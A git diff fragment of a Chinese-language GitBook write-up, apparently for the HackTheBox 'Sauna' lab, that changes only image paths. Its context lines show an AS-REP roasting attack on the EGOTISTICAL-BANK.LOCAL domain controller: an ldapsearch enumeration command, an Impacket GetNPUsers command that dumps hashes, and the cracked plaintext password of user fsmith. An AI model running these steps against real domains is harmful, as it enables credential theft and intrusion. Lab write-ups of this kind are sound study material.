@@ -82,13 +82,13 @@ ldapsearch -x -H LDAP://10.129.95.180 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub
 ./GetNPUsers.Py 'EGOTISTICAL-BANK.LOCAL/' -usersfile username.txt -format hashcat -outputfile hashes.aspro -dc-ip 10.129.95.180
 ```
 
-<figure><img src="../../.gitbook/assets/12 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/12 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 从这个hash中得知是fsmith这个账户的，破解该hash后获得明文密码：**Thestrokes23**
 
-<figure><img src="../../.gitbook/assets/13 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/13 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/14 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/14 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/15 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
